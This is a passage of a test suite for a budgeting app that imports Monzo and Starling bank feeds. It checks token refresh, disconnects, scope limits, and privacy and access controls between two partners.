monzo.rate = true; const n429 = reqs.length;
NOW += 15 * 60000; c.bankPoll();
s = call({key: kE, action: "bank.status"}).bank;
ok("429: backs off", /slow down/.test(s.lastError) && !s.needsReconnect && s.connected);
const n429b = reqs.length; NOW += 15 * 60000; c.bankPoll();
ok("and the next poll waits", reqs.length === n429b, reqs.length - n429b);
monzo.rate = false; NOW += 3 * 3600000; c.bankPoll();
ok("then carries on", !call({key: kE, action: "bank.status"}).bank.lastError);
// the 90 days are up: Monzo refuses, refresh refuses too
monzo.tokens = {}; monzo.refreshes = {};
const keep = rows(F, "transactions").length;
NOW += 15 * 60000; c.bankPoll();
s = call({key: kE, action: "bank.status"}).bank;
ok("401/403: needs reconnecting", s.needsReconnect && !s.connected && /reconnect/i.test(s.lastError), s);
ok("data kept", rows(F, "transactions").length === keep);
const nRe = reqs.length; NOW += 15 * 60000; c.bankPoll();
ok("no more polling until reconnected", reqs.length === nRe);
ok("sync now says so", call({key: kE, action: "bank.syncNow"}).ok === false);
// reconnecting after the 90 days doesn't need the client details again
const reAu = call({key: kE, action: "bank.monzo.authUrl"});
ok("a connection that needs reconnecting can sign in again", reAu.ok && /state=/.test(reAu.url));
monzo.refreshes = {};
html = cb({code: SECRET.code, state: new URL(reAu.url).searchParams.get("state")});
ok("and is connected again", /Budgie is connected to Monzo/.test(html) && call({key: kE, action: "bank.status"}).bank.connected === true && JSON.parse(F.env.userProps.BANK_TOKEN_ethan).access === SECRET.access1, call({key: kE, action: "bank.status"}).bank);
ok("a working connection can't be signed in over", call({key: kE, action: "bank.monzo.authUrl"}).ok === false);

// ================= disconnect =================
monzo.tokens[SECRET.access2] = true; F.env.userProps.BANK_TOKEN_ethan = JSON.stringify(Object.assign(tokE(), {access: SECRET.access2, expiresAt: NOW + 3600000}));
const dc = call({key: kE, action: "bank.disconnect"});
ok("disconnect", dc.ok && !F.env.userProps.BANK_TOKEN_ethan && !F.env.userProps.BANK_CLIENT_ethan);
ok("Monzo logout called", reqs.some(r => r.method === "post" && r.url === "https://api.monzo.com/oauth2/logout") && !monzo.tokens[SECRET.access2]);
ok("imported rows stay", rows(F, "transactions").length === keep);
ok("status after disconnect", call({key: kE, action: "bank.status"}).bank.needsSetup === true);
ok("review count is the rows still to check", call({key: kE, action: "bank.status"}).bank.review === rows(F, "transactions").filter(r => r.person === "ethan" && r.review === true && !r.deleted).length && call({key: kE, action: "bank.status"}).bank.review >= 4, [call({key: kE, action: "bank.status"}).bank.review, rows(F, "transactions").filter(r => r.person === "ethan" && r.review === true && !r.deleted).length, [...new Set(rows(F, "transactions").map(r => typeof r.review + ":" + r.review))]]);

// ================= Starling =================
ok("a token that can pay is refused", /more than Budgie needs/.test(call({key: kS, action: "bank.starling.setToken", token: SECRET.starlingWrite}).error) && !F.env.userProps.BANK_TOKEN_sophie);
ok("a token missing boxes is refused", /missing/.test(call({key: kS, action: "bank.starling.setToken", token: SECRET.starlingThin}).error) && !F.env.userProps.BANK_TOKEN_sophie);
ok("a wrong token is refused", call({key: kS, action: "bank.starling.setToken", token: "sl-not-a-real-token-at-all-000"}).ok === false && !F.env.userProps.BANK_TOKEN_sophie);
const sst = call({key: kS, action: "bank.starling.setToken", token: SECRET.starling});
ok("a read-only token is taken and imported", sst.ok === true && !sst.note && F.env.userProps.BANK_TOKEN_sophie, sst);
s = call({key: kS, action: "bank.status"}).bank;
ok("Starling accounts and Spaces (no Spaces box: skipped quietly)", s.provider === "starling" && s.connected && s.reapproveBy === "" && JSON.stringify(s.accounts.map(a => [a.extId, a.kind, a.balance])) === JSON.stringify([["sacc-0001", "main", 175], ["goal-rent", "space", 525], ["goal-savings", "space", 120]]), s);
tx = rows(F, "transactions");
const sb = (id) => tx.find(r => r.id === "bk-starling-" + id);
ok("Starling payment", sb("sfi-aldi") && sb("sfi-aldi").amount === 23.1 && sb("sfi-aldi").person === "sophie" && sb("sfi-aldi").account === "s-main" && sb("sfi-aldi").budget === "s-food" && sb("sfi-aldi").source === "starling", sb("sfi-aldi"));
ok("Starling refund", sb("sfi-refund") && sb("sfi-refund").amount === -5);
ok("declined and upcoming skipped", !sb("sfi-declined") && !sb("sfi-upcoming"));
ok("the planned rent share isn't a payment", !sb("sfi-rentshare"));
ok("unmapped Space: no move", !rows(F, "moves").some(m => m.id === "bk-starling-sfi-goal"));
ok("Starling balance", (rows(F, "valuations").find(v => v.id === "bk-sacc-0001-" + new Intl.DateTimeFormat("en-CA", {timeZone: "Europe/London"}).format(new RealDate(NOW))) || {}).note === "from Starling");
ok("map Sophie's Space", call({key: kS, action: "bank.map", extId: "goal-savings", account: "s-savings"}).ok);
NOW += 15 * 60000; c.bankPoll();
const gm = rows(F, "moves").find(m => m.id === "bk-starling-sfi-goal");
ok("then the Space move comes in", gm && gm.from === "s-main" && gm.to === "s-savings" && gm.amount === 50 && gm.key === "bank:sfi-goal", gm);
E.sync();
ok("Sophie's private payment never reaches Ethan, not even its id", !E.T.transactions.some(r => /^bk-starling-/.test(r.id) && r.id !== "bk-starling-sfi-aldi-split") && !JSON.stringify(E.T).includes("Private Shop"), E.T.transactions.filter(r => /starling/.test(r.id)));
ok("nor her bank balances", !E.T.valuations.some(v => /^bk-sacc/.test(v.id)));
// Sophie marks her Aldi shop as split, then changes her mind: Ethan's phone gets it, then drops it
call({key: kS, ops: [{op: "put", table: "transactions", row: {id: "bk-starling-sfi-aldi", split: "half", review: false}}]});
E.sync();
ok("a bank payment Sophie splits reaches Ethan", E.T.transactions.some(r => r.id === "bk-starling-sfi-aldi" && r.split === "half"));
NOW += 60000; call({key: kS, ops: [{op: "put", table: "transactions", row: {id: "bk-starling-sfi-aldi", split: ""}}]});
E.sync();
ok("and leaves his phone when she unsplits it", !B.load(E.T).transactions.some(r => r.id === "bk-starling-sfi-aldi"));
ok("still nothing about her other payments", !E.T.transactions.some(r => /^bk-starling-/.test(r.id) && r.id !== "bk-starling-sfi-aldi"));
ok("Ethan's key can't see Sophie's bank", call({key: kE, action: "bank.status"}).bank.provider === "");
ok("Ethan can't map Sophie's Space", call({key: kE, action: "bank.map", extId: "goal-rent", account: "e-bills"}).ok === false);

// ================= review fixes: squatted ids, Peckish, pending holds, payday ticks, history, stale phones =================
const freshMonzo = () => { monzo.tokens = {}; monzo.refreshes = {}; monzo.rate = false; monzo.approved = true; monzo.historyClosed = false; monzo.pageDelay = 0; monzo.closeAfter = 0; monzo.strictCursor = false; monzo.txCalls = 0; };
// connect Monzo for Ethan in an environment, with the pots mapped
const connectMonzo = (G, map) => {
  G.call({key: G.kE, action: "bank.monzo.setClient", clientId: CLIENT_ID, clientSecret: SECRET.clientSecret});
  const st = new URL(G.call({key: G.kE, action: "bank.monzo.authUrl"}).url).searchParams.get("state");
  const o = G.c.doGet({parameter: {code: SECRET.code, state: st}}); responses.push(o.getContent ? o.getContent() : o.text);
  if (map) { Object.keys(map).forEach(ext => G.call({key: G.kE, action: "bank.map", extId: ext, account: map[ext]})); NOW += 60000; G.call({key: G.kE, action: "bank.syncNow"}); }
};
const grow = (G, t) => { G.c.CACHE_ = {}; return G.c.readTable_(t).rows; };
{
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  monzo.txns = monzoData(planned).concat([
    mtx("tx_hold", "2026-11-16", -5000, {merchant: merchant("Hotel Stay", "holidays"), category: "holidays", pending: true}),
    mtx("tx_hold2", "2026-11-05", -2500, {merchant: merchant("Car Hire", "transport"), category: "transport", pending: true})
  ]);
  const G = bankEnv(t => {
    // Sophie has her own one-off item called "e" (so an id can start like one of Ethan's), and split a Peckish shop half
    t.bills.push({id: "e", person: "sophie", name: "Odd", amount: 1, account: "s-main", unit: "once", start: "2026-12-01"});
    t.transactions.push({id: "t-pk-shop1", date: "2026-11-02", person: "sophie", amount: 60, budget: "s-food", account: "s-main", note: "Sainsbury's big shop", source: "peckish", split: "half"});
  });
  // S4: Sophie tries to take the ids Ethan's import and settings will need
  const sq = G.call({key: G.kS, ops: [
    {op: "put", table: "exceptions", row: {id: "x-e-pay-2026-10-29-amount", item: "e", date: "2026-10-29", action: "amount", amount: 1}},
    {op: "put", table: "exceptions", row: {id: "x-e-pay-2026-10-29-bank-ethan", item: "e", date: "2026-10-29", action: "amount", amount: 1}},
    {op: "put", table: "settings", row: {id: "ethan:share.totals", person: "sophie", key: "share.totals", value: "false"}},
    {op: "put", table: "transactions", row: {id: "bk-monzo-tx_tesco", date: "2026-11-01", person: "sophie", amount: 1}},
    {op: "put", table: "moves", row: {id: "bk-monzo-tx_potbills", date: "2026-10-29", person: "sophie", from: "s-main", to: "s-rent", amount: 1}},
    {op: "put", table: "exceptions", row: {id: "x-e-2026-12-01-skip", item: "e", date: "2026-12-01", action: "skip"}}
  ]});
  ok("S4: Sophie can't take Ethan's ids (her own change still saves)", sq.ok && sq.rejected.map(x => x.i).join() === "0,1,2,3,4" && sq.applied.map(x => x.id).join() === "x-e-2026-12-01-skip", sq.rejected);
  // (someone else's ids get the same answer as their rows do, so the answer never says whether something of theirs exists)
  ok("S4: the reasons say why", /can't change that \(exceptions\)/.test(sq.rejected[0].error) && /can't change that \(settings\)/.test(sq.rejected[2].error) && /bank feed/.test(sq.rejected[3].error), sq.rejected);
  // a squatted id typed straight into the sheet still doesn't stop Ethan's import
  const exSh = G.env.sheets.exceptions, exHead = exSh.getRange(1, 1, 1, exSh.getLastColumn()).getValues()[0];
  exSh.appendRow(exHead.map(h => ({id: "x-e-pay-2026-10-29-bank-ethan", item: "e", date: "2026-10-29", action: "amount", amount: 1})[h] ?? ""));
  const txSh = G.env.sheets.transactions, txHead = txSh.getRange(1, 1, 1, txSh.getLastColumn()).getValues()[0];
  txSh.appendRow(txHead.map(h => ({id: "bk-monzo-tx_tesco", date: "2026-11-01", person: "sophie", amount: 1})[h] ?? ""));
  connectMonzo(G, {pot_bills: "e-bills", pot_food: ""});
  const sg = G.call({key: G.kE, action: "bank.status"}).bank;
  ok("S4: Ethan's import runs anyway", sg.connected && !sg.lastError && grow(G, "transactions").some(r => r.id === "bk-monzo-tx_friend"), sg);
  ok("S4: the squatted rows are left alone and logged", grow(G, "exceptions").find(r => r.id === "x-e-pay-2026-10-29-bank-ethan").amount === 1 && grow(G, "transactions").find(r => r.id === "bk-monzo-tx_tesco").person === "sophie" && G.env.logs.some(l => /skipped .*x-e-pay-2026-10-29-bank-ethan/.test(l)), G.env.logs.filter(l => /skipped/.test(l)));
  ok("S4: Ethan's settings id is still his to use", G.call({key: G.kE, ops: [{op: "put", table: "settings", row: {id: "ethan:share.totals", person: "ethan", key: "share.totals", value: "true"}}]}).applied.length === 1);
  // C1: Sophie's half-split Peckish shop is the Sainsbury's Ethan's bank paid
  const shop = grow(G, "transactions").find(r => r.id === "t-pk-shop1");
  const bkS = grow(G, "transactions").find(r => r.id === "bk-monzo-tx_sainsburys");
  ok("C1: a half-split Peckish shop the partner logged waits, unchanged, for the payer to check their bank payment", shop.person === "sophie" && !shop.bankId && shop.amount === 60 && shop.split === "half" && bkS && bkS.person === "ethan" && bkS.account === "e-main" && bkS.amount === 62.4 && bkS.split === "" && bkS.splitHint !== "half" && bkS.review === true, {shop, bkS});   // the partner's rows are never looked at
  // C2: a hold that goes to nothing, and one that disappears
  ok("C2: pending holds imported", grow(G, "transactions").some(r => r.id === "bk-monzo-tx_hold" && !r.deleted) && grow(G, "transactions").some(r => r.id === "bk-monzo-tx_hold2" && !r.deleted));
  monzo.txns.find(t => t.id === "tx_hold").amount = 0;
  monzo.txns = monzo.txns.filter(t => t.id !== "tx_hold2");
  NOW += 15 * 60000; G.c.bankPoll();
  ok("C2: a hold that went to £0 is removed", grow(G, "transactions").find(r => r.id === "bk-monzo-tx_hold").deleted === true);
  ok("C2: a week-old hold that vanished is removed", grow(G, "transactions").find(r => r.id === "bk-monzo-tx_hold2").deleted === true);
  // C3: the bank ticked the LISA payday move; the app ticks it too
  const tick = G.call({key: G.kE, ops: [{op: "put", table: "moves", row: {id: "mv-app-1", date: "2026-10-29", person: "ethan", from: "e-main", to: "e-lisa", amount: 300, key: "pay:2026-10-29:e-lisa"}}]});
  const copy = grow(G, "moves").find(r => r.id === "mv-app-1");
  ok("C3: a second tick of the same payday move is kept as a copy, not counted", tick.applied.length === 1 && copy.deleted === true && /Same payday move as bk-monzo-tx_moneybox/.test(copy.note), copy);
  const dbG = B.load((() => { G.c.CACHE_ = {}; return G.c.allTables_(); })(), "2026-11-17");
  near("C3: the LISA got £300 once", B.balances(dbG, "2026-11-17")["e-lisa"] - B.balances(dbG, "2026-10-28")["e-lisa"], 300);
  // C5: a phone that's behind sends an old copy of a bank row
  const E2 = G.call({key: G.kE, ops: [{op: "put", table: "transactions", row: {id: "bk-monzo-tx_friend", amount: 1, date: "2020-01-01", account: "e-car", bankId: "forged", deleted: false, person: "ethan", budget: "e-fun", note: "Paid Sam back for tickets", review: false}}]});
  const fr = grow(G, "transactions").find(r => r.id === "bk-monzo-tx_friend");
  ok("C5: the phone can change what it's for, the note and the review", E2.applied.length === 1 && fr.budget === "e-fun" && fr.note === "Paid Sam back for tickets" && fr.review === false);
  ok("C5: but not the amount, date, account or bank link", fr.amount === 20 && fr.date === "2026-11-06" && fr.account === "e-main" && fr.bankId === "tx_friend", fr);
  G.call({key: G.kE, ops: [{op: "delete", table: "transactions", id: "bk-monzo-tx_friend"}]});
  G.call({key: G.kE, ops: [{op: "put", table: "transactions", row: {id: "bk-monzo-tx_friend", deleted: false, note: "back"}}]});
  // (Undo after deleting it: the one who took it off can bring it back; one the bank feed took off stays off)
  ok("C5: a phone can dismiss a bank row, and bring back one it dismissed itself (Undo)", grow(G, "transactions").find(r => r.id === "bk-monzo-tx_friend").deleted === false);
  G.call({key: G.kE, ops: [{op: "delete", table: "transactions", id: "bk-monzo-tx_friend"}]});
  ok("C5: and dismiss it again", grow(G, "transactions").find(r => r.id === "bk-monzo-tx_friend").deleted === true);
  G.call({key: G.kE, ops: [{op: "put", table: "transactions", row: {id: "bk-monzo-tx_hold", note: "edited first", deleted: false}}]});
  G.call({key: G.kE, ops: [{op: "put", table: "transactions", row: {id: "bk-monzo-tx_hold", deleted: false}}]});
  const held = grow(G, "transactions").find(r => r.id === "bk-monzo-tx_hold");
  ok("C5: a phone can't bring back one the bank feed took off, even after changing it", held.deleted === true && held.by === "bank", held);
  G.call({key: G.kE, ops: [{op: "put", table: "transactions", row: {id: "t-own-1", date: "2026-11-10", person: "ethan", amount: 4, budget: "e-fun", bankId: "tx_tesco"}}]});
  ok("C5: a phone can't link its own row to the bank", !grow(G, "transactions").find(r => r.id === "t-own-1").bankId);
  NOW += 15 * 60000; G.c.bankPoll();
  ok("C5: and the next import doesn't undo the phone's choices", grow(G, "transactions").find(r => r.id === "bk-monzo-tx_friend").deleted === true);
}
// C4: the first full read is refused because the 5 minutes are up: Budgie reads 89 days instead
{
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned); monzo.historyClosed = true;
  const H = bankEnv();
  const n0 = reqs.length;
  connectMonzo(H);
  let sh = H.call({key: H.kE, action: "bank.status"}).bank;
  ok("C4: just after sign-in a refused full read waits", sh.waitingForApproval && !sh.needsReconnect, sh);
  NOW += 6 * 60000; H.c.bankPendingImports();
  sh = H.call({key: H.kE, action: "bank.status"}).bank;
  ok("C4: after 5 minutes it falls back to the last 90 days", sh.connected && !sh.waitingForApproval && sh.note === "Monzo only lets Budgie read the last 90 days now" && grow(H, "transactions").some(r => r.id === "bk-monzo-tx_tesco"), sh);
  const since = reqs.slice(n0).filter(r => /\/transactions\?/.test(r.url) && /since=20/.test(r.url)).map(r => decodeURIComponent(r.url.match(/since=([^&]+)/)[1]));
  ok("C4: that read asked for 89 days", since.length && Math.round((NOW - RealDate.parse(since[since.length - 1])) / 86400000) === 89, since);
  NOW += 15 * 60000; const n1 = reqs.length; H.c.bankPoll();
  ok("C4: and then it doesn't try the full history again", !reqs.slice(n1).some(r => /\/transactions\?/.test(r.url) && !/since=/.test(r.url)));
}
// S2: secrets an earlier version kept with the script move to the owner's User Properties
{
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const M = bankEnv();
  M.env.props.BANK_CLIENT_ethan = JSON.stringify({id: CLIENT_ID, secret: SECRET.clientSecret});
  M.env.props["BANK_OAUTH_" + "b".repeat(64)] = JSON.stringify({person: "ethan", state: "b".repeat(64), exp: NOW + 60000});
  M.call({key: M.kE, action: "bank.status"});
  ok("S2: moved out of Script Properties", !Object.keys(M.env.props).some(k => /^BANK_(TOKEN|CLIENT|OAUTH)_/.test(k)) && M.env.userProps.BANK_CLIENT_ethan && M.env.userProps["BANK_OAUTH_" + "b".repeat(64)]);
  // S5: the rotated refresh token is saved even if saving fails at first
  connectMonzo(M);
  const up = M.c.PropertiesService.getUserProperties; let failTok = 0;
  M.c.PropertiesService.getUserProperties = () => { const s = up(); const set = s.setProperty; s.setProperty = (k, v) => { if (k === "BANK_TOKEN_ethan" && failTok > 0) { failTok--; throw new Error("Service invoked too many times"); } return set(k, v); }; return s; };
  const tokM = () => JSON.parse(M.env.userProps.BANK_TOKEN_ethan);
  M.env.userProps.BANK_TOKEN_ethan = JSON.stringify(Object.assign(tokM(), {expiresAt: NOW - 1}));
  failTok = 2; NOW += 15 * 60000; M.c.bankPoll();
  ok("S5: refresh token saved on a retry", tokM().refresh === SECRET.refresh2 && !M.call({key: M.kE, action: "bank.status"}).bank.needsReconnect);
  M.env.userProps.BANK_TOKEN_ethan = JSON.stringify(Object.assign(tokM(), {expiresAt: NOW - 1}));
  failTok = 99; NOW += 15 * 60000; M.c.bankPoll(); failTok = 0;
  ok("S5: if it can't be saved, it waits beside the old record", M.env.userProps.BANK_TOKEN_NEXT_ethan && JSON.parse(M.env.userProps.BANK_TOKEN_NEXT_ethan).refresh === "ref-ETHAN-3-ffffffff" && tokM().refresh === SECRET.refresh2);
  NOW += 15 * 60000; M.c.bankPoll();
  ok("S5: and is picked up next time", tokM().refresh === "ref-ETHAN-3-ffffffff" && !M.env.userProps.BANK_TOKEN_NEXT_ethan && !M.call({key: M.kE, action: "bank.status"}).bank.needsReconnect, M.call({key: M.kE, action: "bank.status"}).bank);
  ok("S5: disconnecting tells the owner", (M.call({key: M.kE, action: "bank.disconnect"}), M.env.mail.some(m => /the bank was disconnected/.test(m.body))));
}
// S8: exactly the read scopes Budgie uses; checked again every day. C9: spending Space payments by category
{
  NOW = RealDate.parse("2026-11-17T12:00:00Z");
  const I = bankEnv();
  starling.identity[SECRET.starlingPayee] = ["account-list:read", "balance:read", "transaction:read", "payee:read"];
  ok("S8: a read scope Budgie doesn't use is refused too", /more than Budgie needs \(payee:read\)/.test(I.call({key: I.kS, action: "bank.starling.setToken", token: SECRET.starlingPayee}).error));
  starling.identity[SECRET.starlingOdd] = ["account-list:read", "balance:read", "transaction:read", "Space:Read"];
  ok("S8: and an oddly written one", I.call({key: I.kS, action: "bank.starling.setToken", token: SECRET.starlingOdd}).ok === false);
  starling.identity[SECRET.starlingSpaces] = ["account-list:read", "balance:read", "transaction:read", "savings-goal:read", "space:read"];
  starling.feed.push(sfi("sfi-funspend", "2026-11-06", 1200, "OUT", {categoryUid: "scat-fun", counterPartyName: "Bowling", spendingCategory: "ENTERTAINMENT"}));
  ok("S8: the full read-only set is fine", I.call({key: I.kS, action: "bank.starling.setToken", token: SECRET.starlingSpaces}).ok === true);
  ok("S5: Starling can't be changed while connected", /Disconnect Starling first/.test(I.call({key: I.kS, action: "bank.starling.setToken", token: SECRET.starling}).error));
  ok("C9: a spending Space is listed", I.call({key: I.kS, action: "bank.status"}).bank.accounts.some(a => a.extId === "space-fun" && a.kind === "space"));
  I.call({key: I.kS, action: "bank.map", extId: "space-fun", account: "s-rent"}); NOW += 60000; I.call({key: I.kS, action: "bank.syncNow"});
  ok("C9: its payments go to the account it's mapped to", (grow(I, "transactions").find(r => r.id === "bk-starling-sfi-funspend") || {}).account === "s-rent", grow(I, "transactions").find(r => r.id === "bk-starling-sfi-funspend"));
  // a day later the token can suddenly do something else: Budgie disconnects it
  starling.identity[SECRET.starlingSpaces] = starling.identity[SECRET.starlingSpaces].concat(["pay-local:create"]);
  NOW += 25 * 3600000; I.c.bankPoll();
  const si = I.call({key: I.kS, action: "bank.status"}).bank;
  ok("S8: scopes changed: disconnected, with the reason", si.needsSetup && !I.env.userProps.BANK_TOKEN_sophie && /can do something different now/.test(si.lastError), si);
  ok("S8: and the owner is told", I.env.mail.some(m => /Sophie's bank connection/.test(m.subject) && /disconnected/.test(m.body)));
  starling.feed = starling.feed.filter(f => f.feedItemUid !== "sfi-funspend");
}

// ================= second security review: disconnect races, real log-out, one Monzo user, own accounts only, no £0 =================
{
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  ok("R2: connected for the race test", !!G.env.userProps.BANK_TOKEN_ethan);
  // a refresh that's on its way when Ethan disconnects: the new token is never kept
  const tk = JSON.parse(G.env.userProps.BANK_TOKEN_ethan);
  const realFetch = G.c.UrlFetchApp.fetch;
  G.c.UrlFetchApp.fetch = (url, params) => {
    const r = realFetch(url, params);
    if (/oauth2\/token/.test(url) && params.payload && params.payload.grant_type === "refresh_token") { G.c.UrlFetchApp.fetch = realFetch; G.c.bankDisconnect_("ethan"); }   // the tap lands mid-refresh
    return r;
  };
  try { G.c.monzoRefresh_("ethan", tk); } catch (e) {}
  G.c.UrlFetchApp.fetch = realFetch;
  ok("R2: a refresh that finishes after a disconnect isn't saved", !G.env.userProps.BANK_TOKEN_ethan && !G.env.userProps.BANK_TOKEN_NEXT_ethan && !G.env.userProps.BANK_CLIENT_ethan);
  ok("R2: and its new session is ended at Monzo", Object.keys(monzo.tokens).length === 0, Object.keys(monzo.tokens));
  ok("R2: status says disconnected", G.call({key: G.kE, action: "bank.status"}).bank.connected === false);
}
{
  // disconnecting with an expired token still logs out at Monzo (refresh first, then log out)
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const tk = JSON.parse(G.env.userProps.BANK_TOKEN_ethan); delete monzo.tokens[tk.access];   // the access token has expired at Monzo
  const before = reqs.length;
  ok("R3: disconnect works", G.call({key: G.kE, action: "bank.disconnect"}).ok === true && !G.env.userProps.BANK_TOKEN_ethan);
  const after = reqs.slice(before).map(r => r.method + " " + new URL(r.url).pathname);
  ok("R3: an expired token is refreshed, then logged out", after.indexOf("post /oauth2/token") >= 0 && after.lastIndexOf("post /oauth2/logout") > after.indexOf("post /oauth2/token") && Object.keys(monzo.tokens).length === 0, after);
}
{
  // reconnecting with a different Monzo account is turned away
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  ok("R6: the Monzo user is remembered", JSON.parse(G.env.userProps.BANK_TOKEN_ethan).userId === "user_00009ETHAN");
  const s0 = JSON.parse(G.env.props.BANK_STATUS_ethan); s0.needsReconnect = true; G.env.props.BANK_STATUS_ethan = JSON.stringify(s0);
  const st = new URL(G.call({key: G.kE, action: "bank.monzo.authUrl"}).url).searchParams.get("state");
  const realFetch = G.c.UrlFetchApp.fetch;
  G.c.UrlFetchApp.fetch = (url, params) => { const r = realFetch(url, params); if (/oauth2\/token/.test(url) && params.payload.grant_type === "authorization_code") { const j = JSON.parse(r.getContentText()); j.user_id = "user_SOMEONEELSE"; const t = JSON.stringify(j); return {getResponseCode: () => 200, getContentText: () => t, getHeaders: () => ({})}; } return r; };
  const o = G.c.doGet({parameter: {code: SECRET.code, state: st}}), h = o.getContent ? o.getContent() : o.text; responses.push(h);
  G.c.UrlFetchApp.fetch = realFetch;
  ok("R6: a different Monzo account is turned away", /different Monzo account/.test(h) && JSON.parse(G.env.userProps.BANK_TOKEN_ethan).userId === "user_00009ETHAN", h);
  ok("R6: and the owner is told", G.env.mail.some(m => /different Monzo account/.test(m.body)));
}
{
  // a joint account and Flex stay out; one with no balance isn't saved as £0
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const keepAcc = monzo.accounts, keepBal = monzo.balance;
  monzo.accounts = keepAcc.concat([{id: "acc_joint", description: "joint", type: "uk_retail_joint", closed: false}]);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const ask = reqs.filter(r => /\/accounts\?/.test(r.url)).pop();
  const listed = G.call({key: G.kE, action: "bank.status"}).bank.accounts.map(a => a.extId);
  ok("R4: Budgie asks Monzo for personal accounts only, and a joint account is left out", ask && /account_type=uk_retail/.test(ask.url) && listed.indexOf("acc_joint") < 0, {ask: ask && ask.url, listed});
  monzo.balance = {currency: "GBP"}; NOW += 86400000; G.call({key: G.kE, action: "bank.syncNow"});
  const today = new Intl.DateTimeFormat("en-CA", {timeZone: "Europe/London"}).format(new RealDate(NOW));
  ok("R8: no balance from the bank: no £0 valuation", !grow(G, "valuations").some(v => v.id === "bk-acc_00009main-" + today));
  monzo.accounts = keepAcc; monzo.balance = keepBal;
}

{
  // one lock for the phone and the poll: the owner's user lock (a web app gets no document lock, as in real Apps Script)
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const used = [], L0 = () => ({waitLock: () => {}, tryLock: () => true, releaseLock: () => {}});
  let busy = false;
  G.c.LockService = {getScriptLock: L0, getDocumentLock: () => null, getUserLock: () => ({tryLock: () => { used.push("user"); return !busy; }, waitLock: () => {}, releaseLock: () => {}})};
  NOW += 31000; G.call({key: G.kE, action: "bank.syncNow"}); G.c.bankPoll();
  ok("R2b: the phone's sync and the 15-minute poll take the same lock", used.length >= 2 && used.every(x => x === "user"), used);
  // a busy lock when Monzo sends you back keeps the sign-in, so reloading the page finishes it
  const s0 = JSON.parse(G.env.props.BANK_STATUS_ethan); s0.needsReconnect = true; G.env.props.BANK_STATUS_ethan = JSON.stringify(s0);
  const st = new URL(G.call({key: G.kE, action: "bank.monzo.authUrl"}).url).searchParams.get("state");
  busy = true; let o = G.c.doGet({parameter: {code: SECRET.code, state: st}}); busy = false;
  ok("R2b: a busy moment doesn't use up the sign-in", /busy/.test(o.getContent ? o.getContent() : o.text) && !!G.env.userProps["BANK_OAUTH_" + st]);
  o = G.c.doGet({parameter: {code: SECRET.code, state: st}});
  ok("R2b: and opening it again connects", /connected to Monzo/.test(o.getContent ? o.getContent() : o.text));
}

// ================= third security review =================
{
  // P1: a partner can't use a made-up "Peckish" shop to find out about the other's private bank payments
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv();
  const pkS = JSON.parse(Buffer.from(G.c.appLink("sophie", "peckish").split("#connect=")[1], "base64url").toString()).k;
  // with her own Budgie key: any id, source "peckish", split half, aimed at Ethan's payment to a friend (£20 on 6 Nov)
  const p1 = G.call({key: G.kS, ops: [{op: "put", table: "transactions", row: {id: "probe-1", date: "2026-11-06", person: "sophie", amount: 21, budget: "s-food", account: "s-main", split: "half", note: "Sam Smith", source: "peckish"}}]});
  // with her Peckish key: a shop with a made-up name, aimed at Ethan's £18 Deliveroo
  const p2 = G.call({key: pkS, ops: [{op: "put", table: "transactions", row: {id: "t-pk-probe2", date: "2026-11-01", person: "sophie", amount: 17, budget: "s-food", account: "s-main", split: "half", note: "Groceries", source: "peckish"}}]});
  // a real shared shop: Sophie logs the Tesco shop in Peckish, Ethan's card paid it
  const p3 = G.call({key: pkS, ops: [{op: "put", table: "transactions", row: {id: "t-pk-tesco", date: "2026-11-01", person: "sophie", amount: 44, budget: "s-food", account: "s-main", split: "half", note: "Tesco big shop", source: "peckish"}}]});
  ok("P1: the probes were saved", p1.applied.length === 1 && p2.applied.length === 1 && p3.applied.length === 1, [p1, p2, p3]);
  const S = phone(G, G.kS); S.sync();
  connectMonzo(G, {acc_00009main: "e-main"});
  const t1 = grow(G, "transactions"), r1 = t1.find(r => r.id === "probe-1"), r2 = t1.find(r => r.id === "t-pk-probe2"), r3 = t1.find(r => r.id === "t-pk-tesco");
  ok("P1: a row Peckish didn't make is never linked to the partner's bank payment", r1.person === "sophie" && !r1.bankId && r1.amount === 21 && t1.some(r => r.id === "bk-monzo-tx_friend" && r.person === "ethan"), r1);
  ok("P1: a Peckish shop that doesn't name the same shop isn't linked either", r2.person === "sophie" && !r2.bankId && r2.amount === 17 && t1.some(r => r.id === "bk-monzo-tx_deliveroo"), r2);
  const e3 = t1.find(r => r.id === "bk-monzo-tx_tesco");
  ok("P1: a real shared shop is matched to whoever's bank paid it", r3.person === "sophie" && !r3.bankId && r3.amount === 44 && e3 && e3.person === "ethan" && e3.amount === 45.2 && e3.review === true, {r3, e3});
  ok("P1: and nothing of the partner's shop is carried onto it", e3.split === "" && e3.splitHint !== "half", e3);
  S.sync();
  const sees = JSON.stringify(S.T.transactions || []);
  ok("P1: so the partner's phone never learns the payer's amount", !/45\.2/.test(sees) && !(S.T.transactions || []).some(r => r.person === "ethan" && !r.deleted), (S.T.transactions || []).filter(r => r.person === "ethan"));
  ok("P1: and keeps its own copy of the shop, unchanged, until then", (S.T.transactions || []).some(r => r.id === "t-pk-tesco" && !r.deleted && r.amount === 44) && (S.T.transactions || []).some(r => r.id === "probe-1" && r.amount === 21), (S.T.transactions || []).filter(r => /tesco|probe/.test(r.id)));
